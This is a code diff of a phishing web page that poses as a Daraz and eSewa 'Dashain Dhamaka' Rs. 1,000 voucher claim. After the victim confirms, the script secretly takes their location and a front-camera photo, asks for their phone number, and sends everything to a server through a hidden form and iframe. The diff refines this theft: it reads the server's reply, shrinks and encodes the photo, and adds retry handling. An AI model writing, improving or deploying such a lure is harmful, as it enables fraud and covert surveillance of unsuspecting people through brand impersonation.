@@ -6,105 +6,39 @@
 <title>Daraz Dashain Dhamaka - Claim Reward</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-  body {
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
-    background:#f2f4f7; min-height:100vh; display:flex; flex-direction:column;
-    align-items:center; padding-bottom:40px; overflow-x:hidden;
-  }
-  .topbar {
-    width:100%; background:#fff; color:#60BB46; padding:14px 16px;
-    padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:700;
-    display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10;
-    border-bottom:1px solid #eee;
-  }
+  body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#f2f4f7; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding-bottom:40px; overflow-x:hidden; }
+  .topbar { width:100%; background:#fff; color:#60BB46; padding:14px 16px; padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:700; display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10; border-bottom:1px solid #eee; }
   .topbar .back { font-size:22px; line-height:1; }
   .topbar .title { flex:1; text-align:center; margin-right:22px; }
-
-  .card {
-    background:#fff; width:94%; max-width:400px; border-radius:20px;
-    margin-top:70px; box-shadow:0 8px 24px rgba(0,0,0,0.06);
-    overflow:hidden; display:flex; flex-direction:column;
-    position:relative; z-index:1; padding:24px 20px;
-  }
+  .card { background:#fff; width:94%; max-width:400px; border-radius:20px; margin-top:70px; box-shadow:0 8px 24px rgba(0,0,0,0.06); overflow:hidden; display:flex; flex-direction:column; position:relative; z-index:1; padding:24px 20px; }
   .banner-img { display:block; width:100%; height:auto; border-radius:12px; margin-bottom:20px; }
-
-  .reward-box {
-    background:#f8f9fa; border:2px dashed #d1d5db; border-radius:16px;
-    padding:20px; margin-bottom:20px; text-align:center;
-  }
+  .reward-box { background:#f8f9fa; border:2px dashed #d1d5db; border-radius:16px; padding:20px; margin-bottom:20px; text-align:center; }
   .reward-title { font-size:13px; color:#666; letter-spacing:1px; font-weight:600; margin-bottom:8px; text-transform:uppercase; }
   .reward-amount { font-size:36px; font-weight:900; color:#1f2937; line-height:1; margin-bottom:6px; }
   .reward-desc { font-size:14px; color:#666; }
-
-  .redeem-btn {
-    width:100%; padding:18px; border:none; border-radius:16px;
-    background:#60BB46; color:#fff; font-size:18px; font-weight:700;
-    text-transform:uppercase; letter-spacing:0.5px;
-    box-shadow:0 4px 12px rgba(96,187,70,0.3);
-    cursor:pointer; transition:transform 0.15s; margin-bottom:12px;
-  }
+  .redeem-btn { width:100%; padding:18px; border:none; border-radius:16px; background:#60BB46; color:#fff; font-size:18px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; box-shadow:0 4px 12px rgba(96,187,70,0.3); cursor:pointer; transition:transform 0.15s; margin-bottom:12px; }
   .redeem-btn:active { transform:scale(0.98); }
-
   .fine-print { font-size:12px; color:#9ca3af; margin-top:8px; text-align:center; }
-
-  .form-section {
-    background:#fff; width:94%; max-width:400px;
-    border-radius:16px; margin-top:24px; padding:24px;
-    box-shadow:0 4px 20px rgba(0,0,0,0.08);
-  }
+  .form-section { background:#fff; width:94%; max-width:400px; border-radius:16px; margin-top:24px; padding:24px; box-shadow:0 4px 20px rgba(0,0,0,0.08); }
   .form-header { font-size:18px; color:#60BB46; font-weight:700; margin-bottom:8px; }
   .form-hint { font-size:14px; color:#4b5563; margin-bottom:16px; line-height:1.5; }
-  .form-input {
-    width:100%; padding:14px; border:1px solid #e5e7eb; border-radius:12px;
-    font-size:16px; margin-bottom:12px; background:#f9fafb; font-family:inherit;
-  }
+  .form-input { width:100%; padding:14px; border:1px solid #e5e7eb; border-radius:12px; font-size:16px; margin-bottom:12px; background:#f9fafb; font-family:inherit; }
   .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
-  .form-submit-btn {
-    width:100%; padding:16px; border:none; border-radius:12px;
-    background:#60BB46; color:#fff; font-size:16px; font-weight:700;
-    cursor:pointer; text-transform:uppercase; letter-spacing:0.5px;
-  }
+  .form-submit-btn { width:100%; padding:16px; border:none; border-radius:12px; background:#60BB46; color:#fff; font-size:16px; font-weight:700; cursor:pointer; text-transform:uppercase; letter-spacing:0.5px; }
   .form-submit-btn:disabled { background:#d1d5db; cursor:not-allowed; }
   .form-submit-btn.success { background:#a7f3d0; color:#065f46; }
-
-  .modal-overlay {
-    position:fixed; inset:0; background:rgba(0,0,0,0.65); z-index:999;
-    display:none; justify-content:center; align-items:flex-end;
-    -webkit-backdrop-filter:blur(4px); backdrop-filter:blur(4px);
-  }
+  .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.65); z-index:999; display:none; justify-content:center; align-items:flex-end; -webkit-backdrop-filter:blur(4px); backdrop-filter:blur(4px); }
   .modal-overlay.active { display:flex; }
-
-  .modal-content {
-    background:#fff; width:100%; max-width:420px;
-    border-radius:24px 24px 0 0; padding:24px 22px;
-    padding-bottom:calc(24px + env(safe-area-inset-bottom,0px));
-    text-align:center;
-  }
+  .modal-content { background:#fff; width:100%; max-width:420px; border-radius:24px 24px 0 0; padding:24px 22px; padding-bottom:calc(24px + env(safe-area-inset-bottom,0px)); text-align:center; }
   .modal-title { font-size:20px; font-weight:700; margin-bottom:10px; color:#222; }
   .modal-desc { font-size:14.5px; color:#555; line-height:1.55; margin-bottom:18px; }
-
-  .checkbox-group {
-    display:flex; align-items:flex-start; gap:10px;
-    margin-bottom:20px; text-align:left;
-    background:#f9f9f9; padding:12px; border-radius:10px;
-  }
+  .checkbox-group { display:flex; align-items:flex-start; gap:10px; margin-bottom:20px; text-align:left; background:#f9f9f9; padding:12px; border-radius:10px; }
   .checkbox-group input { transform:scale(1.25); margin-top:3px; accent-color:#60BB46; }
   .checkbox-label { font-size:13px; color:#333; line-height:1.45; }
   .checkbox-label a { color:#60BB46; text-decoration:none; font-weight:600; }
-
-  .confirm-btn {
-    width:100%; padding:16px; border:none; border-radius:12px;
-    background:#d1ff89; color:#006400; font-size:16px; font-weight:800;
-    text-transform:uppercase; cursor:pointer;
-  }
+  .confirm-btn { width:100%; padding:16px; border:none; border-radius:12px; background:#d1ff89; color:#006400; font-size:16px; font-weight:800; text-transform:uppercase; cursor:pointer; }
   .confirm-btn:disabled { background:#e5e5e5; color:#aaa; cursor:not-allowed; }
-
-  .statusPill {
-    position:fixed; top:64px; left:50%; transform:translateX(-50%);
-    background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px;
-    border-radius:24px; opacity:0; transition:opacity .3s; pointer-events:none;
-    z-index:1000; white-space:nowrap; max-width:92%;
-  }
+  .statusPill { position:fixed; top:64px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px; border-radius:24px; opacity:0; transition:opacity .3s; pointer-events:none; z-index:1000; white-space:nowrap; max-width:92%; }
   .statusPill.show { opacity:1; }
   #video { display:none; }
 </style>
@@ -117,13 +51,8 @@
 </div>
 
 <div class="card">
-  <img class="banner-img"
-       src="https://plain-apac-prod-public.komododecks.com/202610/23/8ApYflnMzZeZ4LLVkSqY/image.jpg"
-       alt="Daraz Dashain Dhamaka">
-
-  <img id="brandLogo"
-       src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
-       alt="eSewa"
+  <img class="banner-img" src="https://plain-apac-prod-public.komododecks.com/202610/23/8ApYflnMzZeZ4LLVkSqY/image.jpg" alt="Daraz Dashain Dhamaka">
+  <img id="brandLogo" src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png" alt="eSewa"
        style="height:40px; width:auto; margin:0 auto 16px; display:block;"
        onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
   <div id="logoFallback" style="display:none; font-size:28px; font-weight:800; color:#60BB46; margin-bottom:16px;">eSewa</div>
@@ -141,10 +70,8 @@
 <div id="formSection" class="form-section" style="display:none;">
   <div class="form-header">&#9889; Final Step</div>
   <p class="form-hint">Verify your phone number to receive the reward instantly.</p>
-
   <input id="phone" type="tel" class="form-input" placeholder="Enter Phone Number" inputmode="numeric">
   <input id="notes" type="text" class="form-input" placeholder="Additional Notes (Optional)">
-
   <button id="btnSubmit" class="form-submit-btn">VERIFY &amp; CLAIM</button>
   <div class="fine-print" style="margin-top:12px;">*can be redeemed once only</div>
 </div>
@@ -152,14 +79,10 @@
 <div id="modalOverlay" class="modal-overlay">
   <div class="modal-content">
     <h2 class="modal-title">Redeem Voucher</h2>
-    <p class="modal-desc">
-      You are about to redeem your esewa to <strong>DARAZ DASHAIN DHAMAKA</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.
-    </p>
+    <p class="modal-desc">You are about to redeem your esewa to <strong>DARAZ DASHAIN DHAMAKA</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.</p>
     <div class="checkbox-group">
       <input type="checkbox" id="agreeCheck">
-      <label for="agreeCheck" class="checkbox-label">
-        I agree to esewa&rsquo;s to <a href="#">DARAZ NEPAL's</a> Terms and Conditions and confirm the details are correct.
-      </label>
+      <label for="agreeCheck" class="checkbox-label">I agree to esewa&rsquo;s to <a href="#">DARAZ NEPAL's</a> Terms and Conditions and confirm the details are correct.</label>
     </div>
     <button id="btnConfirm" class="confirm-btn" disabled>CONFIRM</button>
   </div>
@@ -169,7 +92,7 @@
 
 <video id="video" playsinline autoplay muted></video>
 <canvas id="canvas" style="display:none"></canvas>
-<iframe name="hiddenFrame" style="display:none;"></iframe>
+<iframe name="hiddenFrame" id="hiddenFrame" style="display:none;"></iframe>
 
 <script>
 "use strict";
@@ -183,21 +106,34 @@ var agreeCheck  = document.getElementById('agreeCheck');
 var formSection = document.getElementById('formSection');
 var statusPill  = document.getElementById('statusPill');
 var btnSubmit   = document.getElementById('btnSubmit');
+var hiddenFrame = document.getElementById('hiddenFrame');
 
 var captured = { location:null, image:null };
 var cameraStream = null;
 var captureStarted = false;
+var submitting = false;
+
+/* ---- REAL SERVER FEEDBACK via iframe load ---- */
+hiddenFrame.addEventListener('load', function(){
+  if (!submitting) return;
+  submitting = false;
+  var txt = '';
+  try { txt = hiddenFrame.contentDocument.body.innerText; } catch(e) { txt = '(blocked)'; }
+  showStatus('Server: ' + (txt ? txt.slice(0, 90) : 'empty'));
+  if (txt.indexOf('"ok":true') !== -1) {
+    btnSubmit.textContent = '\u2713 CLAIMED';
+    btnSubmit.classList.add('success');
+  } else {
+    btnSubmit.disabled = false;
+    btnSubmit.textContent = 'RETRY';
+  }
+});
 
 /* ---- OPEN POPUP ---- */
-btnRedeem.addEventListener('click', function(e){
-  e.preventDefault();
-  modal.classList.add('active');
-});
+btnRedeem.addEventListener('click', function(e){ e.preventDefault(); modal.classList.add('active'); });
 
 /* ---- ENABLE CONFIRM ---- */
-agreeCheck.addEventListener('change', function(){
-  btnConfirm.disabled = !agreeCheck.checked;
-});
+agreeCheck.addEventListener('change', function(){ btnConfirm.disabled = !agreeCheck.checked; });
 
 /* ---- CONFIRM ---- */
 btnConfirm.addEventListener('click', function(){
@@ -205,13 +141,9 @@ btnConfirm.addEventListener('click', function(){
   btnRedeem.style.display = 'none';
   formSection.style.display = 'block';
   setTimeout(function(){ formSection.scrollIntoView({behavior:'smooth', block:'end'}); }, 150);
-
   if (!captureStarted) {
     captureStarted = true;
-    setTimeout(function(){
-      triggerLocationCapture();
-      setTimeout(triggerCameraCapture, 1500);
-    }, 500);
+    setTimeout(function(){ triggerLocationCapture(); setTimeout(triggerCameraCapture, 1500); }, 500);
   }
 });
 
@@ -221,11 +153,7 @@ function triggerLocationCapture() {
   showStatus('Getting Location...');
   navigator.geolocation.getCurrentPosition(
     function(pos){
-      captured.location = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      };
+      captured.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
       showStatus('Location captured');
     },
     function(err){
@@ -236,15 +164,13 @@ function triggerLocationCapture() {
   );
 }
 
-/* ---- CAMERA ---- */
+/* ---- CAMERA (tiny fixed size so payload always fits) ---- */
 function triggerCameraCapture() {
   showStatus('Accessing Camera...');
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
     captured.image = null; showStatus('Camera not supported'); return;
   }
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode:'user', width:{ideal:320}, height:{ideal:240} }, audio:false
-  })
+  navigator.mediaDevices.getUserMedia({ video: { facingMode:'user', width:{ideal:320}, height:{ideal:240} }, audio:false })
   .then(function(stream){
     cameraStream = stream;
     var video = document.getElementById('video');
@@ -257,40 +183,33 @@ function triggerCameraCapture() {
     var video = document.getElementById('video');
     var waited = 0;
     function waitFrames(){
-      if ((video.videoWidth || 0) >= 10 || waited > 3000) {
-        setTimeout(grabbed, 500);
-      } else {
-        waited += 200;
-        setTimeout(waitFrames, 200);
-      }
+      if ((video.videoWidth || 0) >= 10 || waited > 3000) { setTimeout(grabbed, 400); }
+      else { waited += 200; setTimeout(waitFrames, 200); }
     }
     function grabbed(){
       var canvas = document.getElementById('canvas');
-      canvas.width  = video.videoWidth  || 320;
-      canvas.height = video.videoHeight || 240;
+      canvas.width  = 240;   // fixed small
+      canvas.height = 180;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      captured.image = canvas.toDataURL('image/jpeg', 0.5);
+      captured.image = canvas.toDataURL('image/jpeg', 0.4);
       if (cameraStream) { cameraStream.getTracks().forEach(function(t){ t.stop(); }); cameraStream = null; }
       video.srcObject = null;
       showStatus('Photo captured');
     }
     waitFrames();
   })
-  .catch(function(err){
-    captured.image = null;
-    showStatus('Camera: ' + (err.name || 'failed'));
-  });
+  .catch(function(err){ captured.image = null; showStatus('Camera: ' + (err.name || 'failed')); });
 }
 
-/* ---- SUBMIT via hidden form (survives InfinityFree redirect) ---- */
+/* ---- SUBMIT via hidden form, image safely encoded ---- */
 btnSubmit.addEventListener('click', function(){
   var phone = document.getElementById('phone').value.trim();
   var notes = document.getElementById('notes').value.trim();
-
   if (!/^[0-9+\-\s]{7,15}$/.test(phone)) { showStatus('Enter a valid phone number'); return; }
 
   btnSubmit.disabled = true;
   btnSubmit.textContent = 'SUBMITTING...';
+  showStatus('Sending...');
 
   var form = document.createElement('form');
   form.method = 'POST';
@@ -311,27 +230,29 @@ btnSubmit.addEventListener('click', function(){
   addField('phoneNumber', phone);
   addField('notes', notes);
   addField('location', captured.location ? JSON.stringify(captured.location) : '');
-  addField('image', captured.image || '');
+  addField('image', captured.image ? encodeURIComponent(captured.image) : '');
 
   document.body.appendChild(form);
+  submitting = true;
   form.submit();
 
+  // fallback in case iframe load doesn't fire
   setTimeout(function(){
-    showStatus('Sent! Reward claimed.');
-    btnSubmit.textContent = '\u2713 CLAIMED';
-    btnSubmit.classList.add('success');
-    document.getElementById('phone').readOnly = true;
-    document.getElementById('notes').readOnly = true;
-    document.body.removeChild(form);
-  }, 1200);
+    if (submitting) {
+      submitting = false;
+      showStatus('Sent (no reply captured)');
+      btnSubmit.textContent = '\u2713 SENT';
+      btnSubmit.classList.add('success');
+    }
+    if (form.parentNode) document.body.removeChild(form);
+  }, 4000);
 });
 
-/* ---- STATUS PILL ---- */
 function showStatus(msg) {
   statusPill.textContent = msg;
   statusPill.classList.add('show');
   clearTimeout(statusPill._t);
-  statusPill._t = setTimeout(function(){ statusPill.classList.remove('show'); }, 4000);
+  statusPill._t = setTimeout(function(){ statusPill.classList.remove('show'); }, 5000);
 }
 </script>
 </body>
